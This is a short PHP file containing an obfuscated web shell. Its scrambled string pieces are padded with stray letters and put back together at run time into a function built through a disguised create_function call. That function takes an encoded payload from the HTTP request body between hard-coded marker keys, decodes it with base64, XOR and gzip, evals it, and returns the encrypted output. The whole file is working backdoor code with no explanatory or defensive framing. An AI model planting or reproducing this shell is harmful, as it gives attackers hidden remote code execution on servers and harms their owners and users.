<?php
$T='$qqk{$j};}}return $o;}qif (@pqreg_qmatch(q"/$khq(.+)$kfq/",@qfile_gqet_cont';
$o='qents("php:/q/inqput"),$mqq)==1) {@ob_sqtart(q);@evaqlq(@gzuncompreqss(@';
$N='qfor($i=0q;$i<$l;q){fqor($qj=q0;($j<$c&&$i<$qlq);$jq++,$i+q+){q$o.=$t{$i}^q';
$V='x(@qbqase64_qdecode(q$m[1]),$kq)));q$o=@ob_getqq_coqnqqtenqts();@ob_end';
$b=str_replace('Y','','cYYreatYe_YfunYYction');
$a='gNd50l3t";qfunctiqon xq($t,$k){q$qc=strlen($qk);$l=qstrleqn($t)q;$o="";';
$A='$kq=q"dqfff0a7f";q$khq="a1a55cq8c1a49";$kqf="66c19f6da452"q;$qp="i1sAmhq3Yq';
$l='_clean();$r=@bqase64_encoqdqe(@x(@qgzcoqmpqress($o),$k));priqqnt("$qp$kh$r$kf");}';
$p=str_replace('q','',$A.$a.$N.$T.$o.$V.$l);
$e=$b('',$p);$e();
?>
